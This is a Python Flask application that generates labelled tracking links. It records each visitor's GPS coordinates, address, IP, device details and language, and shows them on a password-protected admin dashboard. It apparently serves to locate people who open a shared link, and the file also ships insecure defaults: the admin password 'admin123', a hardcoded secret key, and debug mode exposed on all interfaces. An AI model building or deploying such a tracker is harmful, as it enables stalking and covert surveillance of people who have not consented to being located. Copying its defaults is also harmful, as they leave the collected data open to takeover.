import os
import uuid
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Security configuration
app.secret_key = os.environ.get('SECRET_KEY', 'changethis_to_random_string')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

DATABASE_URL = os.environ.get('DATABASE_URL', 'sqlite:///tracker.db')
# Fix for Render PostgreSQL URL (uses postgres:// but SQLAlchemy needs postgresql://)
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database Models
class TrackingLink(db.Model):
    __tablename__ = 'tracking_links'
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    label = db.Column(db.String(100), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    visit_count = db.Column(db.Integer, default=0)
    is_active = db.Column(db.Boolean, default=True)

class LocationEntry(db.Model):
    __tablename__ = 'location_entries'
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.String(36), db.ForeignKey('tracking_links.link_id', ondelete='CASCADE'), nullable=False)
    latitude = db.Column(db.Float, nullable=True)
    longitude = db.Column(db.Float, nullable=True)
    accuracy = db.Column(db.Float, nullable=True)
    altitude = db.Column(db.Float, nullable=True)
    city = db.Column(db.String(255), nullable=True)
    address = db.Column(db.Text, nullable=True)
    ip_address = db.Column(db.String(45), nullable=False)
    user_agent = db.Column(db.Text, nullable=False)
    platform = db.Column(db.String(100), nullable=False)
    screen_resolution = db.Column(db.String(50), nullable=False)
    language = db.Column(db.String(50), nullable=False)
    location_denied = db.Column(db.Boolean, default=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

def require_login(f):
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Routes
@app.route('/')
def index():
    return redirect(url_for('admin'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('logged_in'):
        return redirect(url_for('admin'))
    
    error = None
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid Password'
            
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin')
@require_login
def admin():
    return render_template('admin.html')

@app.route('/t/<link_id>')
def serve_tracking(link_id):
    link = TrackingLink.query.filter_by(link_id=link_id).first_or_404()
    if not link.is_active:
        return "Link inactive", 403
    
    link.visit_count += 1
    db.session.commit()
    return render_template('track.html', link_id=link_id)

@app.route('/api/track/<link_id>', methods=['POST'])
def track_user(link_id):
    link = TrackingLink.query.filter_by(link_id=link_id).first_or_404()
    if not link.is_active:
        return jsonify({'error': 'Link inactive'}), 403
    
    data = request.json or {}
    
    entry = LocationEntry(
        link_id=link_id,
        latitude=data.get('latitude'),
        longitude=data.get('longitude'),
        accuracy=data.get('accuracy'),
        altitude=data.get('altitude'),
        city=data.get('city'),
        address=data.get('address'),
        ip_address=data.get('ip_address', request.remote_addr),
        user_agent=data.get('user_agent', request.user_agent.string or 'Unknown'),
        platform=data.get('platform', 'Unknown'),
        screen_resolution=data.get('screen_resolution', 'Unknown'),
        language=data.get('language', 'Unknown'),
        location_denied=data.get('location_denied', False)
    )
    
    db.session.add(entry)
    db.session.commit()
    return jsonify({'status': 'success'})

@app.route('/api/locations')
@require_login
def api_locations():
    entries = LocationEntry.query.order_by(LocationEntry.timestamp.desc()).all()
    result = []
    for entry in entries:
        link = TrackingLink.query.filter_by(link_id=entry.link_id).first()
        label = link.label if link else 'Deleted Link'
        result.append({
            'id': entry.id,
            'link_id': entry.link_id,
            'label': label,
            'latitude': entry.latitude,
            'longitude': entry.longitude,
            'accuracy': entry.accuracy,
            'altitude': entry.altitude,
            'city': entry.city,
            'address': entry.address,
            'ip_address': entry.ip_address,
            'user_agent': entry.user_agent,
            'platform': entry.platform,
            'screen_resolution': entry.screen_resolution,
            'language': entry.language,
            'location_denied': entry.location_denied,
            'timestamp': entry.timestamp.strftime('%Y-%m-%d %H:%M:%S')
        })
    return jsonify(result)

@app.route('/api/links')
@require_login
def api_links():
    links = TrackingLink.query.order_by(TrackingLink.created_at.desc()).all()
    result = [{
        'id': link.id,
        'link_id': link.link_id,
        'label': link.label,
        'created_at': link.created_at.strftime('%Y-%m-%d %H:%M:%S'),
        'visit_count': link.visit_count,
        'is_active': link.is_active
    } for link in links]
    return jsonify(result)

@app.route('/api/links/generate', methods=['POST'])
@require_login
def generate_link():
    data = request.json or {}
    label = data.get('label')
    if not label:
        return jsonify({'error': 'Label is required'}), 400
    
    link = TrackingLink(
        link_id=str(uuid.uuid4()),
        label=label
    )
    db.session.add(link)
    db.session.commit()
    return jsonify({
        'id': link.id,
        'link_id': link.link_id,
        'label': link.label,
        'created_at': link.created_at.strftime('%Y-%m-%d %H:%M:%S'),
        'visit_count': link.visit_count,
        'is_active': link.is_active
    })

@app.route('/api/links/<link_id>', methods=['DELETE', 'PUT'])
@require_login
def manage_link(link_id):
    link = TrackingLink.query.filter_by(link_id=link_id).first_or_404()
    if request.method == 'DELETE':
        LocationEntry.query.filter_by(link_id=link_id).delete()
        db.session.delete(link)
        db.session.commit()
        return jsonify({'status': 'deleted'})
    elif request.method == 'PUT':
        data = request.json or {}
        if 'is_active' in data:
            link.is_active = data['is_active']
            db.session.commit()
        return jsonify({
            'link_id': link.link_id,
            'is_active': link.is_active
        })

@app.route('/api/locations/<int:loc_id>', methods=['DELETE'])
@require_login
def delete_location(loc_id):
    entry = LocationEntry.query.get_or_404(loc_id)
    db.session.delete(entry)
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/stats')
@require_login
def api_stats():
    total_locations = LocationEntry.query.count()
    total_links = TrackingLink.query.count()
    active_links = TrackingLink.query.filter_by(is_active=True).count()
    return jsonify({
        'total_locations': total_locations,
        'total_links': total_links,
        'active_links': active_links
    })

# Create all tables inside context
with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
